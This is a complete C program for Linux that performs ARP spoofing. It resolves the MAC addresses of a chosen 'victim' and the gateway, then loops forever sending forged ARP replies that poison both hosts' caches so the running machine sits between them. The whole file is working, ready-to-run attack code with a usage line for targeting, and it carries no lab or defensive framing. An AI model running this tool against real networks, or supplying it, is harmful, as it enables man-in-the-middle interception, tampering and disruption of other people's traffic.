#include <stdio.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/types.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <stdlib.h>

/* constant values */
#define MAC_ADDR_LEN 0x06  /* MAC address length (48 bits) */
#define IPv4_ADDR_LEN 0x04  /* IPv4 address length (32 bits) */

#define ETH_TYPE_PROTO_ARP 0x806  /* EtherType value of ARP */

#define ARP_HTYPE_ETH 1  /* Ethernet */
#define ARP_PTYPE_IP 0x0800  /* IPv4 */

#define ARP_OPER_REQUEST 1  /* ARP request */
#define ARP_OPER_REPLY 2  /* ARP reply */

#define BUFFSIZE 65536

/* Ethernet frame struct */
typedef struct
{
    uint8_t dest[MAC_ADDR_LEN]; /* destination MAC address */
    uint8_t src[MAC_ADDR_LEN];  /* source MAC address */
    uint16_t type;              /* EtherType */
} etherheader_t;

/* ARP packet struct */
typedef struct
{
    uint16_t htype;                     /* hardware type */
    uint16_t ptype;                     /* protocol type */
    unsigned char hlen;                 /* hardware length */
    unsigned char plen;                 /* protocol length */
    uint16_t op;                        /* operation */
    unsigned char sha[MAC_ADDR_LEN];    /* sender hardware address */
    unsigned char spa[IPv4_ADDR_LEN];   /* sender protocol address */
    unsigned char tha[MAC_ADDR_LEN];    /* target hardware address */
    unsigned char tpa[IPv4_ADDR_LEN];   /* target protocol address */
} arpheader_t;

unsigned char localMAC[MAC_ADDR_LEN];   /* local MAC address */
struct in_addr localIP;                 /* local IP address */
char interfaceName[256];                /* network interface name */

/* check if user is root */
int isUserRoot()
{
    /* root's UID is 0 */
    if (getuid() == 0)
        return 1;
    else
        return 0;
}

/* get index of interface */
int getIfIndex(const char* ifname, int* outIfIndex)
{
    struct ifreq ifr;
    strcpy(ifr.ifr_name, ifname);

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    /* getting interface index */
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == 0)
    {
        /* copy index to output variable */
        *outIfIndex = ifr.ifr_ifindex;
        close(sockfd);
        return 0;
    }

    /* if error occurred */
    perror("ioctl");
    close(sockfd);
    return -1;
}

/* print MAC address in readable format */
void printMacAddress(const unsigned char* mac)
{
    /* print MAC address in format aa:bb:cc:dd:ee:ff */
    printf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/* get MAC address of local machine */
int getLocalMacAddress(const char* ifname, unsigned char* outMac)
{
    struct ifreq ifr;
    strcpy(ifr.ifr_name, ifname);

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    /* getting interface's hardware address */
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0)
    {
        /* copy MAC address to output variable */
        memcpy(outMac, ifr.ifr_addr.sa_data, MAC_ADDR_LEN);
        close(sockfd);
        return 0;
    }

    /* if error occurred */
    perror("ioctl");
    close(sockfd);
    return -1;
}

/* print IPv4 address in readable format */
void printIpAddress(const struct in_addr ip)
{
    /* print IPv4 address in dotdecimal format */
    printf("%s", inet_ntoa(ip));
}

/* get MAC address of local machine */
int getLocalIpAddress(const char* ifname, struct in_addr* outIp)
{
    struct ifreq ifr;
    strcpy(ifr.ifr_name, ifname);
    ifr.ifr_addr.sa_family = AF_INET;

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    /* getting interface's IP address */
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == 0)
    {
        struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;

        /* copy IP address to output variable */
        memcpy(outIp, &addr->sin_addr, sizeof(struct in_addr));
        close(sockfd);
        return 0;
    }

    /* if error occurred */
    perror("ioctl");
    close(sockfd);
    return -1;
}

/* get MAC address of remote host using ARP request */
int getMacAddress(const struct in_addr ip, unsigned char* outMac)
{
    etherheader_t etherFrame;
    arpheader_t arpRequest;
    unsigned char broadcastMAC[MAC_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    size_t frameSize = sizeof(etherheader_t) + sizeof(arpheader_t);
    unsigned char* frame = (unsigned char*)malloc(frameSize);
    memset(frame, 0, frameSize);
    int count = 100;

    /* create Ethernet frame */
    memcpy(&etherFrame.dest, broadcastMAC, MAC_ADDR_LEN);
    memcpy(&etherFrame.src, localMAC, MAC_ADDR_LEN);
    etherFrame.type = htons(ETH_TYPE_PROTO_ARP);

    /* create ARP packet */
    arpRequest.op = htons(ARP_OPER_REQUEST);
    arpRequest.htype = htons(ARP_HTYPE_ETH);
    arpRequest.hlen = MAC_ADDR_LEN;
    arpRequest.ptype = htons(ARP_PTYPE_IP);
    arpRequest.plen = IPv4_ADDR_LEN;
    memcpy(&arpRequest.tha, broadcastMAC, MAC_ADDR_LEN);
    memcpy(&arpRequest.tpa, &ip, sizeof(struct in_addr));
    memcpy(&arpRequest.sha, localMAC, MAC_ADDR_LEN);
    memcpy(&arpRequest.spa, &localIP, sizeof(struct in_addr));
    
    int sockfd;

    /* create socket to send ARP request */
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
    {
        /* if error occurred */
        perror("socket");
        free(frame);
        return -1;
    }

    struct ifreq ifr;
    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));

    /* bind socket to the interface */
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0)
    {
        /* if error occurred */
        perror("setsockopt");
        close(sockfd);
        free(frame);
        return -1;
    }

    int ifindex;
    if(getIfIndex(interfaceName, &ifindex) < 0)
    {
        /* if error occurred */
        perror("ioctl");
        close(sockfd);
        free(frame);
        return -1;
    }

    /* socket address struct (link-layer) */
    struct sockaddr_ll sockAddr;
    sockAddr.sll_family = AF_PACKET;
    sockAddr.sll_protocol = htons(ETH_P_ARP);
    sockAddr.sll_halen = MAC_ADDR_LEN;
    sockAddr.sll_hatype = htons(ARPHRD_ETHER);
    sockAddr.sll_ifindex = ifindex;
    sockAddr.sll_pkttype = (PACKET_BROADCAST);
    memcpy(&sockAddr.sll_addr, &arpRequest.sha, MAC_ADDR_LEN);

    memcpy(frame, &etherFrame, sizeof(etherFrame));
    memcpy(frame + sizeof(etherFrame), &arpRequest, sizeof(arpRequest));

    /* send ARP request */
    if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0)
    {
        /* if error occurred */
        perror("sendto");
        free(frame);
        return -1;
    }

    free(frame);

    int i;
    unsigned char buffer[BUFFSIZE];

    /* receive ARP reply */
    for (i = 0; i < count; i++)
    {
        memset(buffer, 0, BUFFSIZE);
        if(recvfrom(sockfd, buffer, BUFFSIZE, 0, NULL, NULL) < 0)
        {
            /* if error occurred */
            perror("recvfrom");
            continue;
        }

        /* dissect Ethernet frame from received buffer */
        etherheader_t* ethFrameRecvd = (etherheader_t*)buffer;

        /* if frame is ARP */
        if (ntohs(ethFrameRecvd->type) == ETH_TYPE_PROTO_ARP)
        {
            /* dissect Ethernet frame from received buffer */
            arpheader_t* arpResp = (arpheader_t*)(buffer + sizeof(etherheader_t));
            if (ntohs(arpResp->op) == 2)
            {
                /* copy MAC address of remote host to output */
                memcpy(outMac, ethFrameRecvd->src, MAC_ADDR_LEN);
                return 0;
            }
        }
    }

    return -1;
}

/* sending spoofed ARP packet */
int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* destMAC, const struct in_addr srcIP, const unsigned char* srcMAC)
{
    etherheader_t etherFrame;
    arpheader_t arpReply;
    size_t frameSize = sizeof(etherheader_t) + sizeof(arpheader_t);
    unsigned char* frame = (unsigned char*)malloc(frameSize);
    memset(frame, 0, frameSize);

    /* create Ethernet frame */
    memcpy(&etherFrame.dest, destMAC, MAC_ADDR_LEN);
    memcpy(&etherFrame.src, srcMAC, MAC_ADDR_LEN);
    etherFrame.type = htons(ETH_TYPE_PROTO_ARP);

    /* create ARP packet */
    arpReply.op = htons(ARP_OPER_REPLY);
    arpReply.htype = htons(ARP_HTYPE_ETH);
    arpReply.hlen = MAC_ADDR_LEN;
    arpReply.ptype = htons(ARP_PTYPE_IP);
    arpReply.plen = IPv4_ADDR_LEN;
    memcpy(&arpReply.tha, destMAC, MAC_ADDR_LEN);
    memcpy(&arpReply.tpa, &destIP, sizeof(struct in_addr));
    memcpy(&arpReply.sha, srcMAC, MAC_ADDR_LEN);
    memcpy(&arpReply.spa, &srcIP, sizeof(struct in_addr));
    
    int sockfd;

    /* create socket to send ARP packet */
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
    {
        /* if error occurred */
        perror("socket");
        free(frame);
        return -1;
    }

    struct ifreq ifr;
    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));

    /* bind socket to the interface */
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0)
    {
        /* if error occurred */
        perror("setsockopt");
        close(sockfd);
        free(frame);
        return -1;
    }

    int ifindex;
    if(getIfIndex(interfaceName, &ifindex) < 0)
    {
        /* if error occurred */
        perror("ioctl");
        close(sockfd);
        free(frame);
        return -1;
    }

    /* socket address struct (link-layer) */
    struct sockaddr_ll sockAddr;
    sockAddr.sll_family = AF_PACKET;
    sockAddr.sll_protocol = htons(ETH_P_ARP);
    sockAddr.sll_halen = MAC_ADDR_LEN;
    sockAddr.sll_hatype = htons(ARPHRD_ETHER);
    sockAddr.sll_ifindex = ifindex;
    sockAddr.sll_pkttype = (PACKET_MR_UNICAST);
    memcpy(&sockAddr.sll_addr, &arpReply.sha, MAC_ADDR_LEN);

    memcpy(frame, &etherFrame, sizeof(etherFrame));
    memcpy(frame + sizeof(etherFrame), &arpReply, sizeof(arpReply));

    /* send ARP packet */
    if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0)
    {
        /* if error occurred */
        perror("sendto");
        free(frame);
        return -1;
    }

    free(frame);

    return 0;
}

/* ARP cache poisoning infinite loop */
void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC)
{
    while (1)
    {
        if(sendGratuitousArpReply(victimIP, victimMAC, gatewayIP, localMAC) < 0)
        {
            printf("Sending ARP reply to victim failed\n");
        }
        else
        {
            printf("Sent ARP reply to victim\n");
        }

        if(sendGratuitousArpReply(gatewayIP, gatewayMAC, victimIP, localMAC) < 0)
        {
            printf("Sending ARP reply to gateway failed\n");
        }
        else
        {
            printf("Sent ARP reply to gateway\n");
        }

        sleep(10);
    }
    
}

int main(int argc, char* argv[])
{
    if(!isUserRoot())
    {
        printf("Run this as root\n");
        return 0;
    }

    if (argc < 4)
    {
        printf("usage: sudo %s <iface name> <vitcim's IP> <gateway's IP>", argv[0]);
        return 0;
    }

    printf("Linux ARP spoofer\n-----------------\n");

    strcpy(interfaceName, argv[1]);

    printf("Looking for MAC addresses...\n");

    if(getLocalMacAddress(interfaceName, localMAC) == -1)
    {
        printf("Error during checking local MAC address\n");
        return -1;
    }
    else
    {
        printf("Local MAC address is ");
        printMacAddress(localMAC);
        printf("\n");
    }

    if(getLocalIpAddress(interfaceName, &localIP) == -1)
    {
        printf("Error during checking local IP address\n");
    }
    else
    {
        printf("Local IP address is ");
        printIpAddress(localIP);
        printf("\n");
    }

    struct in_addr victimIP;
    victimIP.s_addr = inet_addr(argv[2]);
    unsigned char victimMAC[MAC_ADDR_LEN];

    struct in_addr gatewayIP;
    gatewayIP.s_addr = inet_addr(argv[3]);
    unsigned char gatewayMAC[MAC_ADDR_LEN];

    if (getMacAddress(victimIP, victimMAC) < 0)
    {
        printf("Unable to find victim's MAC address\n");
        return -1;
    }
    else
    {
        printf("Victim's (%s) MAC address: ", argv[2]);
        printMacAddress(victimMAC);
        printf("\n");
    }

    if (getMacAddress(gatewayIP, gatewayMAC) < 0)
    {
        printf("Unable to find gateway's MAC address\n");
        return -1;
    }
    else
    {
        printf("Gateway's (%s) MAC address: ", argv[3]);
        printMacAddress(gatewayMAC);
        printf("\n");
    }

    printf("Poisoning...\n");
    poisonArp(victimIP, victimMAC, gatewayIP, gatewayMAC);

    return 0;
}
